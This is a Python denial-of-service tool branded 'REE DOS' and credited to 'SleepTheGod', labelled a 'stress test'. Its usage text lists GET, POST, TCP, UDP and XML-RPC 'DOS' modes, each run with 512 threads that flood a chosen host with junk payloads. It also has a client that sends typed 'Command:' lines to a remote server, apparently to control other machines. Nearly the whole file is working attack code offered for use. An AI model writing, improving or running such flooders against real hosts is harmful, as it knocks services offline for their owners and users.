import socket
import ssl
import sys
import threading
import getopt
import re
import time
import logging
from xmlrpc.client import ServerProxy, Fault
from colored import fg, attr  # For colored output (install colored package with pip)
from threading import Thread

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

SERVER_HOST = '127.0.0.1'  # Change this to the IP address of your server
SERVER_PORT = 23  # Change this to the port your server is listening on

HEADER = """
/*
|---------------------------------------------------|
          ____  ____________   ____  ____  _____
         / __ \/ ____/ ____/  / __ \/ __ \/ ___/
        / /_/ / __/ / __/    / / / / / / /\__ \ 
       / _, _/ /___/ /___   / /_/ / /_/ /___/ / 
      /_/ |_/_____/_____/  /_____/\____//____/  
                                              
|---------------------------------------------------|
         _________            __       
        / ____/ (_)__  ____  / /_ _____
       / /   / / / _ \/ __ \/ __// ___/
      / /___/ / /  __/ / / / /__/ /__  
      \____/_/_/\___/_/ /_/\__(_)___/  
                                 
                                   
|---------------------------------------------------|
       _       __     __                        
      | |     / /__  / /________  ____ ___  ___ 
      | | /| / / _ \/ / ___/ __ \/ __ `__ \/ _ \
      | |/ |/ /  __/ / /__/ /_/ / / / / / /  __/
      |__/|__/\___/_/\___/\____/_/ /_/ /_/\___/ 
                 __      
                / /_____ 
               / __/ __ \
              / /_/ /_/ /
              \__/\____/ 
    ____  ____________   ____  ____  _____
   / __ \/ ____/ ____/  / __ \/ __ \/ ___/
  / /_/ / __/ / __/    / / / / / / /\__ \ 
 / _, _/ /___/ /___   / /_/ / /_/ /___/ / 
/_/ |_/_____/_____/  /_____/\____//____/  
|---------------------------------------------------|

               CODED BY SLEEPTHEGOD
                                                                                               
|---------------------------------------------------|
*/
"""

def receive_messages(sock):
    while True:
        try:
            data = sock.recv(4096).decode()
            if not data:
                print("Disconnected from server")
                break
            print(data)
        except ConnectionResetError:
            print("Connection to server reset by peer")
            break
        except OSError as e:
            print("Error:", e)
            break

class Layer4Thread(Thread):
    def __init__(self, target_ip, target_port, protocol):
        Thread.__init__(self)
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:
                if self.protocol.upper() == 'TCP':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                elif self.protocol.upper() == 'UDP':
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                else:
                    logging.error("Invalid protocol. Choose TCP or UDP.")
                    return

                s.connect((self.target_ip, self.target_port))
                message = 'X' * 9999
                if self.protocol.upper() == 'TCP':
                    s.sendall(message.encode())
                else:
                    s.sendto(message.encode(), (self.target_ip, self.target_port))
                s.close()
            except Exception as e:
                logging.error(f"Error during Layer 4 attack: {e}")

class Layer7Thread(Thread):
    def __init__(self, site, dos_type):
        Thread.__init__(self)
        self.site = site
        self.dos_type = dos_type
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:
                server = socket.gethostbyname(self.site)
                post = 'x' * 9999
                file = '/'

                request = f'{self.dos_type.upper()} /{file} HTTP/1.1\r\n'
                request += f'Host: {self.site}\r\n'
                request += 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n'
                request += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
                request += 'Accept-Language: en-us,en;q=0.5\r\n'
                request += 'Accept-Encoding: gzip,deflate\r\n'
                request += 'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n'
                request += 'Keep-Alive: 9000\r\n'
                request += 'Connection: close\r\n'
                request += f'Content-Type: application/x-www-form-urlencoded\r\nContent-length: {len(post)}\r\n\r\n'
                request += f'{post}\r\n'

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((server, 80))
                s.sendall(request.encode())
                s.close()
            except Exception as e:
                logging.error(f"Error during Layer 7 attack: {e}")

class XMLRPCThread(Thread):
    def __init__(self, site, method_name, params):
        Thread.__init__(self)
        self.site = site
        self.method_name = method_name
        self.params = params
        self.kill_received = False

    def run(self):
        while not self.kill_received:
            try:
                server = ServerProxy(self.site)
                method = getattr(server, self.method_name)
                method(*self.params)
            except Fault as e:
                logging.error(f"XML-RPC Fault: {e}")
            except Exception as e:
                logging.error(f"Error during XML-RPC attack: {e}")

def launch_stress_test(site=None, dos_type=None, target_ip=None, target_port=None, protocol=None, method_name=None, params=None):
    thread_count = 512
    logging.info('=' * 60)
    logging.info('Advanced Stress Test by SleepTheGod | Version 2.0'.center(60, '-'))
    logging.info('=' * 60)
    threads = []

    if site and dos_type:
        for _ in range(thread_count):
            thr = Layer7Thread(site, dos_type)
            thr.start()
            threads.append(thr)
    elif target_ip and target_port and protocol:
        for _ in range(thread_count):
            thr = Layer4Thread(target_ip, target_port, protocol)
            thr.start()
            threads.append(thr)
    elif site and method_name:
        for _ in range(thread_count):
            thr = XMLRPCThread(site, method_name, params)
            thr.start()
            threads.append(thr)

    while any(thr.is_alive() for thr in threads):
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            logging.info("\nCtrl-C received! Sending kill signal to threads...")
            for thr in threads:
                thr.kill_received = True
            break

def chat_client():
    try:
        context = ssl.create_default_context()
        with socket.create_connection((SERVER_HOST, SERVER_PORT)) as sock:
            with context.wrap_socket(sock, server_hostname=SERVER_HOST) as ssock:
                logging.info("Connected to server with SSL")
                receive_thread = threading.Thread(target=receive_messages, args=(ssock,))
                receive_thread.start()

                while True:
                    try:
                        message = input("Command: ")
                        if message.lower() == 'exit':
                            break
                        ssock.sendall(message.encode() + b'\n')
                    except KeyboardInterrupt:
                        logging.info("\nKeyboard interrupt detected, exiting chat...")
                        break

    except KeyboardInterrupt:
        logging.info("\nKeyboard interrupt detected, exiting chat...")
    except ConnectionRefusedError:
        logging.error("Connection refused. Make sure the server is running.")
    except Exception as e:
        logging.error(f"Error: {e}")

def show_usage():
    print(HEADER)
    print("Usage:")
    print("  For chat client mode: python script.py")
    print("  For Layer 7 stress testing mode:")
    print("    GET DOS - python script.py -t get http://example.com")
    print("    POST DOS - python script.py -t post http://example.com")
    print("  For Layer 4 stress testing mode:")
    print("    TCP DOS - python script.py -l4 tcp 192.168.1.1 80")
    print("    UDP DOS - python script.py -l4 udp 192.168.1.1 80")
    print("  For XML-RPC stress testing mode:")
    print("    XML-RPC DOS - python script.py -x http://example.com/RPC2 method_name param1 param2 ...")

def main(argv):
    if not argv:
        show_usage()
        sys.exit(2)

    site = None
    dos_type = None
    target_ip = None
    target_port = None
    protocol = None
    method_name = None
    params = None

    try:
        opts, args = getopt.getopt(argv, "ht:l4:x:", ["help", "type=", "layer4=", "xmlrpc="])
    except getopt.GetoptError as err:
        logging.error(str(err))
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            show_usage()
            sys.exit()
        elif opt in ("-t", "--type"):
            dos_type = arg
            if args:
                site = args[0]
        elif opt in ("-l4", "--layer4"):
            protocol = arg
            if len(args) >= 2:
                target_ip = args[0]
                target_port = int(args[1])
        elif opt in ("-x", "--xmlrpc"):
            if len(args) >= 2:
                site = arg
                method_name = args[0]
                params = args[1:]

    if site and dos_type:
        launch_stress_test(site=site, dos_type=dos_type)
    elif target_ip and target_port and protocol:
        launch_stress_test(target_ip=target_ip, target_port=target_port, protocol=protocol)
    elif site and method_name:
        launch_stress_test(site=site, method_name=method_name, params=params)
    else:
        chat_client()

if __name__ == "__main__":
    main(sys.argv[1:])
